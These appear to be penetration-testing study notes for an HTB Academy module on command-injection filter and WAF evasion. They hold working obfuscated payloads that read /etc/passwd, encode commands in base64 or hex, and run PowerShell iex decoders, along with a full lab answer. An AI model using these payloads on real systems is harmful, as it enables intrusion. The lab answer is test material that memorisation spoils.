# Advanced Command Obfuscation

> **🎭 Sophisticated Evasion:** Advanced techniques for bypassing WAFs and sophisticated filtering mechanisms

## Overview

In some instances, we may be dealing with advanced filtering solutions, like **Web Application Firewalls (WAFs)**, and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

These advanced methods are particularly useful when:
- Basic obfuscation fails
- WAF detection is sophisticated
- Multiple filter layers are present
- Custom filtering solutions are deployed

---

## Case Manipulation

> **🔀 Character Case Evasion:** Exploiting case-sensitivity differences between platforms

### Understanding Case Sensitivity

One command obfuscation technique we can use is **case manipulation**, like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word.

### Windows Case Manipulation

**Windows Advantage:** Commands for PowerShell and CMD are **case-insensitive**, meaning they will execute regardless of case:

```powershell
# Original command
whoami

# Case-manipulated variations (all work)
WHOAMI
WhOaMi
wHoAmI
WhoAMI
```

**Testing on Windows:**
```powershell
PS C:\htb> WhOaMi
21y4d
```

### Linux Case Manipulation

**Linux Challenge:** Linux systems are **case-sensitive**, so we need creative solutions.

**Solution: Character Translation**
```bash
# Using tr to convert uppercase to lowercase
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

**Testing on Linux:**
```bash
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
21y4d
```

### Web Application Testing

**Initial Attempt (Fails):**
```http
# This fails due to space characters being filtered
ip=127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
Response: Invalid input
```

**Successful Bypass:**
```http
# Replace spaces with tabs (%09)
ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

# Expected result:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

www-data
```

### Alternative Case Manipulation (Linux)

**Bash Parameter Expansion:**
```bash
# Using lowercase expansion
$(a="WhOaMi";printf %s "${a,,}")
```

**Testing:**
```bash
21y4d@htb[/htb]$ $(a="WhOaMi";printf %s "${a,,}")
21y4d
```

---

## Reversed Commands

> **🔄 String Reversal:** Executing commands by reversing them to avoid detection

### Concept

Another command obfuscation technique is **reversing commands** and having a command template that switches them back and executes them in real-time. We write `imaohw` instead of `whoami` to avoid triggering the blacklisted command.

### Linux Implementation

**Step 1: Get Reversed String**
```bash
kabaneridev@htb[/htb]$ echo 'whoami' | rev
imaohw
```

**Step 2: Execute Reversed Command**
```bash
# Execute original command by reversing it back
$(rev<<<'imaohw')
```

**Testing:**
```bash
21y4d@htb[/htb]$ $(rev<<<'imaohw')
21y4d
```

### Web Application Testing

**Successful Reversed Command Injection:**
```http
# URL-encoded payload
ip=127.0.0.1%0a$(rev<<<'imaohw')

# Expected result:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

www-data
```

### Windows Implementation

**Step 1: Reverse String in PowerShell**
```powershell
PS C:\htb> "whoami"[-1..-20] -join ''
imaohw
```

**Step 2: Execute with PowerShell Sub-shell**
```powershell
# Execute reversed string with iex (Invoke-Expression)
iex "$('imaohw'[-1..-20] -join '')"
```

**Testing:**
```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
21y4d
```

### Advanced Reversed Commands

**Complex Command Reversal:**
```bash
# Original: cat /etc/passwd
# Reversed: dwssap/cte/ tac

# Command construction:
$(rev<<<'dwssap/cte/ tac')
```

**Note:** Character filters must also be considered when reversing - filtered characters should be reversed as well or included when reversing the original command.

---

## Encoded Commands

> **🔐 Encoding Techniques:** Using base64/hex encoding to bypass character filters

### Base64 Encoding (Linux)

**Concept:** Encode commands containing filtered characters to avoid detection and URL-decoding issues.

**Step 1: Encode the Payload**
```bash
kabaneridev@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

**Step 2: Create Decoding Command**
```bash
# Decode and execute in sub-shell
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Testing:**
```bash
kabaneridev@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Key Advantages:**
- ✅ No filtered characters in payload
- ✅ Avoids pipe `|` character (using `<<<` instead)
- ✅ Bypasses URL-decoding issues

### Web Application Testing

**Successful Base64 Injection:**
```http
# Replace spaces with appropriate characters
ip=127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Expected result:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Base64 Encoding (Windows)

**Step 1: Encode String in PowerShell**
```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA
```

**Cross-Platform Encoding (Linux to Windows):**
```bash
# Convert utf-8 to utf-16 before base64 encoding
kabaneridev@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
dwBoAG8AYQBtAGkA
```

**Step 2: Decode and Execute**
```powershell
# Decode and execute with Invoke-Expression
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

**Testing:**
```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
21y4d
```

### Alternative Encoding Methods

**Hex Encoding (xxd):**
```bash
# Encode to hex
echo -n 'whoami' | xxd -p
77686f616d69

# Decode and execute
bash<<<$(xxd -r -p<<<77686f616d69)
```

**OpenSSL Base64 (Alternative):**
```bash
# If base64 command is filtered, use openssl
bash<<<$(openssl base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

## HTB Academy Lab Solution

### Challenge: Advanced Obfuscation

**Question:** Find the output of the following command using one of the techniques you learned in this section:
```bash
find /usr/share/ | grep root | grep mysql | tail -n 1
```

### Why Base64 Encoding is Required

After spawning the target machine and visiting its website's root webpage, students need to use **Burp Suite** or **ZAP** to intercept the request made after clicking the Check button. Since the **pipe operator** (`|`) is in the command, students need to use the **third method** which encodes all characters to avoid filter detection.

### Step-by-Step Solution

**Step 1: Base64 Encode the Command**
```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
```

**Command Output:**
```bash
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

**Step 2: Create Decoding Command**
```bash
# Command that will decode the encoded base64 string in a sub-shell 
# and then pass it to bash to be executed
bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

**Step 3: Bypass Filters and Execute**

Students need to:
- **Bypass space character filter** by using either `%09` (tab) or `$IFS`
- **Use newline operator** `%0a` to separate the payload from the IP address
- **Forward the modified intercepted request**

**Final Payload:**
```http
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

### Lab Result

**Expected Output:**
```
/usr/share/mysql/debian_create_root_user.sql
```

Students will attain this output after successfully executing the base64-encoded command through the command injection vulnerability.

### Alternative Methods (For Reference)

**Method 2: Reversed Command**
```bash
# Step 1: Reverse the command
echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | rev
# Output: 1 n- liat | lqsym perg | toor perg | /erahs/rsu/ dnif

# Step 2: Execute reversed
ip=127.0.0.1%0a$(rev<<<'1 n- liat | lqsym perg | toor perg | /erahs/rsu/ dnif')
```

**Method 3: Case Manipulation + Encoding**
```bash
# Mixed case + base64 encoding (more complex but also viable)
echo -n 'FiNd /UsR/sHaRe/ | GrEp RoOt | GrEp MySqL | TaIl -N 1' | tr "[A-Z]" "[a-z]" | base64
```

### Key Learning Points

1. **Base64 encoding** is essential when dealing with filtered pipe operators (`|`)
2. **Space filter bypass** is still required even with encoding (`%09` or `$IFS`)
3. **Newline injection** (`%0a`) remains the primary injection operator
4. **Burp Suite interception** is necessary to modify requests client-side validation
5. **Multiple techniques** can be combined for complex filtering scenarios

---

## Additional Advanced Techniques

### Wildcard Obfuscation

**Using Asterisk Wildcards:**
```bash
# Original: cat
# Obfuscated: c?t or c*t
/bin/c?t /etc/passwd
```

### Integer Expansion

**Using Bash Arithmetic:**
```bash
# Using arithmetic expansion
echo $((1+1))  # outputs 2
/bin/ca$((16#74)) /etc/passwd  # 't' in hex is 74
```

### Output Redirection

**Avoiding Pipes with Redirection:**
```bash
# Instead of: cat file | grep pattern
# Use: grep pattern < file
grep root < /etc/passwd
```

### Environment Variable Exploitation

**Advanced PATH Manipulation:**
```bash
# Extract characters from multiple variables
${HOME:0:1}${PATH:5:1}${USER:2:1}  # Construct characters
```

---

## Automated Obfuscation Tools

### Recommended Tools

1. **Invoke-Obfuscation** (PowerShell)
2. **Bashfuscator** (Bash)
3. **DOSfuscation** (CMD)
4. **Custom Python Scripts**

### Tool Integration

These tools can automatically generate obfuscated payloads using the techniques covered in this section, making it easier to bypass sophisticated filters during penetration testing.

---

## Detection Evasion Strategy

### Layered Approach

1. **Start Simple** - Basic quote obfuscation
2. **Add Complexity** - Case manipulation
3. **Use Encoding** - Base64/hex when needed
4. **Combine Methods** - Multiple techniques together
5. **Custom Creation** - Unique payloads for specific filters

### Best Practices

- ✅ **Test incrementally** - Add one technique at a time
- ✅ **Avoid common patterns** - Create unique obfuscations
- ✅ **Consider platform** - Use appropriate methods for OS
- ✅ **Monitor responses** - Adjust based on filter behavior
- ✅ **Document successful methods** - For future assessments

This comprehensive approach to advanced command obfuscation provides penetration testers with sophisticated techniques to bypass even the most advanced filtering mechanisms and WAF solutions. 